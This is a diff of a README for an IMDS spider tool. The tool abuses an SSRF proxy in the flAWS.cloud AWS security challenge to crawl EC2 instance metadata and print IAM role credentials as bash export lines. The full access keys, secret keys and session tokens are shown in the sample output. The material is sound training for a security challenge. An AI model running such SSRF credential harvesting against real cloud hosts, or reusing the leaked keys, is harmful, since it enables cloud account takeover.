@@ -4,17 +4,17 @@ Spiders the AWS EC2 IMDS API using a proxy on that EC2.
 _Software is still in development phase, used only for an AWS security challenge_
 
 
-## python3 spider-imds.py -h
+## ./imds-spider.py -h
 Shows the help
 
 ```
-$ python3 spider-imds.py -h
-usage: Scan IMDS [-h] [-p PROXY] [-o OUTPUT] [-ii] [-c]
+$ ./imds-spider.py -h
+usage: IMDS Spider [-h] [-p PROXY] [-o OUTPUT] [-ii] [-c]
 
 options:
   -h, --help            show this help message and exit
   -p PROXY, --proxy PROXY
-                        base url for IMDS
+                        base url for IMDS, use http:// for local
   -o OUTPUT, --output OUTPUT
                         write json to the file
   -ii, --instance-identity
@@ -22,19 +22,21 @@ options:
   -c, --creds           print env script with creds
 ```
 
-## python3 spider-imds.py --proxy http://someec2/proxy
-Uses the proxy application on the EC2 to get to the IMDS endpoint of that EC2.
+## ./imds-spider.py --proxy http://
+Specify `--proxy http://` for local IMDS spidering on an EC2 (untested).
 
-Note that for the http://flAWS.cloud challenge, this proxy is currently hard-coded. 
-So change that in the code before using it for another proxy.
+Note that the proxy has a default value with an endpoint of the http://flAWS.cloud challenge.
+That challenge exposes an URL that is on-purpose vulnerable to an SSRF attack, as it shows in the challenge.
+Or specify that url as `--proxy`.
 
-## python3 spider-imds.py --output imds.json
+## ./imds-spider.py --output imds.json
 Writes the collected json structure to the file.
 
 See the example file stored in this repo.
 
 Logs while spidering:
 ```
+[+] IMDS at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254
 [+] Get /latest ... OK
 [+] Get /latest/dynamic ... OK
 [+] Get /latest/dynamic/instance-identity ... OK
@@ -152,11 +154,12 @@ Logs while spidering:
 The JSON is not shown when the output file is configured.
 
 
-## python3 spider-imds.py --instance-identity
+## ./imds-spider.py --instance-identity
 Only collect the EC2 instance-identity, so doesn't spider.
 
 Example:
 ```
+[+] IMDS at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254
 [+] Get latest/dynamic/instance-identity/document ... OK
 {
     "latest/dynamic/instance-identity": "document",
@@ -181,28 +184,27 @@ Example:
 Finished.
 ```
 
-## python3 spider-imds.py --creds
+## ./imds-spider.py --creds
 Only collects http://flAWS.cloud specific access keys; two different sets.
 Displays the collected info as a bash script with variable exports.
 Uses the `aws cli` environment variables.
 
 Output are lines of bash script to copy:
 ```
+[+] IMDS at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254
 [+] Get latest/dynamic/instance-identity/document ... OK
-[+] Get latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance ... OK
+[+] Get latest/meta-data/iam/security-credentials ... OK
 [+] Get latest/meta-data/iam/security-credentials/flaws ... OK
 echo Copy these aws cli credentials for http://flAWS.cloud challenge
 export ACCOUNT_ID=975426262029
 export INSTANCE_ID=i-05bef8a081f307783
-export AWS_DEFAULT_REGION=us-west-2
-# profile ec2-instance
-export AWS_ACCESS_KEY_ID=ASIA6GG7PSQGXVUYRU6T
-export AWS_SECRET_ACCESS_KEY=hwGUlbdJoktrmY0le9UAC//oieoI3m7VMKyj6m4l
-export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIBlyWGzSvtOgf9zV1f1I1D0F4K2m4i+u1CZq1iQ5FBY/AiBLrRmeYRLTDnazWVZyOKaUnMUbwtVEz2S9HoiYTqz+DSqoBAheEAMaDDk3NTQyNjI2MjAyOSIMzDAMwXbpxmu0P2GmKoUE3TVHqo84C2gkbtOLxDq67gOrfz2SoPLuAZwqBKVEzjoFMM8/VoHToCSt4pWQhBOHjr7OvpSY6Mr54ooRDLbt4WgAZ4jJ37g6z1JNSQpxQD3Pp3FLz/7BelDegpPGv8u9DUJBxEfO4JlXEezS+LXcOEdrlvECvtxTJx5IKfpV/ZCuIKoCx4Yk9Zofmeuk4BegosdJfG5OmNNDjD1Brvx9mM64OtYeXLjNroYWNjsuXN4wDM3ezEoIOwgGnXcpRathbzdygnOLoDD+xujo6KOcq+yZzHjFqMBf0KgD/4yYUSxKw95CbgS4HPW4MEjMDenYHuHBxDe4O9qrMmfHmsUJlMbKAo8pir1hQF2MXDoLsjPxyN0YQqVEKqRUkzQaf65I765P18n1cg2jnhh4nKmVkzC2BcMQjYRKrPVQV+xrWvnOe7ERSpGvCl2IEs4wDNnNilV+QEHW9sblD1sbTCGyXkmhHUBdaSrg/qIgbgmCu7yB/rcutWswaGrsr8hF/r7VcuzfTeyMROe2lcPZEIQIHbfMailjItu/s9xFn/sgUDXyYyWuSjaMDE8Ge8qE/3TJ3E0+c/D+e1uNJxNW2VqPEOV5WUQQ7gtwibhfw0NvoUPDsIxl6y5yGQ1TvTIf2AExXbPWF+mtXJSKF7AH3VQLYNGLsBVcaPi44tdbmm/Y+LruwINaETDGgoGWBjqQAlpPd8RS+cWSmA+U9lG89lZuV7XmwnimHGAAUuJYB4G1o40ZTBD9I3YDu6QdWQULX7pwbYRCeFBMdIGm3Hj4VswwF6NejsmES0yFJZ4Eo2UinGuDfM4mJWZ7xPs10vHn1eA9fu5v/P1kQQT5rXANRNHQIw/AnPvRPaARTfwGAqdMeA16Zv0bj+YVBW1zRrs3LXQlwpLaU/itITCiHkCB9DmEUSfQI5/74PqLjNqXextHTQrWNyUgJDQrYAFGcNnr0cvY+QZTcP/2X253HnSfRN3jT01Tw4FqvFhZPUrMfAlu/4PRehAJff2CDjMOntnTuHYIgNwd8eE/xFJAuHo3Qp73wXfC+LExHF80fF4dmkaP
-# profile flaws
-export AWS_ACCESS_KEY_ID=ASIA6GG7PSQGXWUVFNMH
-export AWS_SECRET_ACCESS_KEY=XY/+z5m9N3ZZVmfAlh+FHWrxk71Z1OETgHK7SFCe
-export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIGadvHeU7sQBMG65XcNjGr4pYjGevCSOtC2/O5M++K+IAiAkp1CLS/R2SH32NI6PuwTUPH73R1bqwZjQoTAeVX1SHSrSBAheEAMaDDk3NTQyNjI2MjAyOSIMbNAJ8n708IERJDQrKq8ESiqxNCGaLvdOXz519z41A2T/FIENkLNwsI76QXF20WqX499TPm94Puv3QF7ZNic5neWRDEUuqCj4eDTUhfDQbptvbIyovz4f5OUTYhb0zgyOphVt8Om1DMPCuYrW0OylkhMMd0vIAtyYzqZFZIcd7nl5MoTFFGnseRuK4eK1uAJ7EyA4420Ln0Tl60Lrf629K6LajDwOsW2Nxyh6Hx36RMkdnFJZoIIeu5vo4Qw2d1YOHWvC8vzOQeNzE9mbDT/r/mlq28kboXSMFfgmADzL14XCwCjfxw1FN+3C83K3ERD0vj0yMCNq9FzjT11lJHvEibF6MZiH3aMqmyh27DXMrq7iqJATw11ssjfiKw6T+B8rB5mxAdTwM6gjcb+z+wgYcCbROIvs6ok0BT8y8BZIe/U7lfFTjf4s3kLZlnlXvX0ESq608e28zOGMRkGLxJ27u4ULMHT59hAVNEnk3QFfGttmydjId+nQRvNapf6srSxF4ql1mUfYS+oxJvv3UAu9eY6ikYv21cAmQ6KEG76smcDA4v9zWtbGMrpx/3A0F+y9UPWvpD5k/oU9J8RG1J76OyEMybvW8R92z8Y2NZ9FKQIkDrhNYINmjw1xRyhfygHqw46PZEyqSPjpZzjDo2/rskzpdxglYT44R253xsQaueTUEu4BtNWl3tSCred7nVdjpNcKUSmF0vh1xpyAQeO6aKi2ZtDmkIHfrdp7yDVjuAVT1YNwXC/Yw1ZktNFTqDDGgoGWBjqqAXM92sGxSCXtJQfWUN7/8EmbhYsNTOoP8ijPUuCNI+FLXBnW9gOyZcg1QPgzJS0ExxWJV14AMSlcYsFkx4cKcxdGLmCMfuXofhjc4fUddgNbBcWKfAYJmVpCHnZJSjnGUA+IlB1AtCgmVkRVPq/WHxQvfqlzYNt3XXaprHA/BrftLYjxutnMwMghPvrx0ixzkfDgO7+7J9taWrzHtIiZyS0qpFa2dlasnGJM
+export AWS_REGION=us-west-2
+export ROLE=flaws
+# or use: aws configure with --profile flaws
+export AWS_ACCESS_KEY_ID=ASIA6GG7PSQG5A6XKAF5
+export AWS_SECRET_ACCESS_KEY=h/YKYfir/Z4JLr8Hy+0MQB3e9a4VlmLPQ2yytxhH
+export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEEkaCXVzLXdlc3QtMiJGMEQCIHQD6kGEwKAtG23r8WwY8yD43TNZ95jOo1HOlICUrpAYAiA0Zwvd8hosbEmXpSINGE6XbLU7VNYJS1bFn9O+K5knWSrSBAhyEAMaDDk3NTQyNjI2MjAyOSIMos3f8U8Ufl7Zr+iYKq8EfgjYVfDxmwPoSa0U06wukxOk8LiFYy7YfdnzBdmYIDyTS26+R5qfelqbA3d4AiKbvibZQX/keVhX029KkJ3H+dG5SaqccrNPnV5h6Kcdi8OqutMVFH77N6IYzQpSSajcXTmQ2Z1RE508Yj/1s6oXVk6pqAihiBIWPgaIZm445hKt7zwihsQC8IvAQvFEN1vhts5h7fjXMOq731Yam2FqiYeOLARNpQyN0Vfk2Ie3Yr2EeCQiJ+NOL71TmeWxXqbUAyi9z8b1k5AAGBJcqgjXOXkkeIJomdEKc3HFI0V3THcXzu6DwvShbJM8OFSZaNwh6VF2+KI+tLLcI3h/d0uWQ10HVIy4PkfdkrwTkJH6sOfEW1bL6P/9F9CQntw3JdoXYeAHwzD6HvcWnn8mg3KtEjWLV28vARcBgwwaBA+YqvvHv9NvuNltU2VETthXctFheT/1F6ZqLrQoSZbdtvkEYlyiGy3QjOhxARd4RPglhJ55FoosT9DpLFAWxGAUe9ZtQIGd7Rn46spW98kND4WAphpqAqEfxJJoh0X8y68J90OOKy19xLDAznKrKQM8B5Jl7s7u0yZVPkjmG+kgle6IPHjBATucNAQu5BCXt+1hGME4MOmUpDZRu0g8HmEAkjfAwiR8a9E7EqPqo6Rdhg9jXmg4/05mclrSpUEEM+CESjVvqldpVBoz3Vn/pKduqKgy9dW5GuDeBDiORYANPF/OTIX8EkZghjkG0KPtO+vtlTDItIWWBjqqARkgphm2LOcsTuYBRgtWTkZdcr/qDjJqSWldvqNvl9SReumYUXYGbfOI9GuYCP8VmqYaw2GyESS1op+yM39zpkxkPlvnnimjdjgB36+4Hcjd2fEisl+3ZYQ9ZHiyvAv5QCbAA0f1JI1aP3Z3nV4MrtaBYcocVW0C1sYew1mP71XrGHx5k+A1oR93OUOr0gVoOa4O9mqMjNeMdMJ9yG5dgAXhT9f5JFlk4+BY
+# apply these, then call: aws sts get-caller-identity
 ```
 
 
